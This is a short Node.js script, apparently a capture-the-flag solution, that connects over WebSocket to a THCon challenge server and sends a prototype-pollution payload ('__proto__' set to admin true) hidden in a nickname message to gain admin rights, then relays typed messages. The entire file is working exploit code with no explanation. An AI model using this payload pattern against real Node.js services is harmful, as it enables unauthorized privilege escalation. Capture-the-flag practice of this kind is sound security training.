const WebSocket = require('ws');

const ws = new WebSocket("ws://remote1.thcon.party:10001");
var input = process.openStdin();

ws.onmessage = (e) => {
  const data = JSON.parse(e.data);
  console.log(data);
};

input.addListener("data", function(mes) {
    if (ws.readyState !== ws.OPEN)
        return;

    var payload = '{"nickname": "leo","color": "#1337ff","__proto__": {"admin": true}}';
    ws.send(payload);

    var messageJson = {message: mes.toString()};
    ws.send(JSON.stringify(messageJson));
});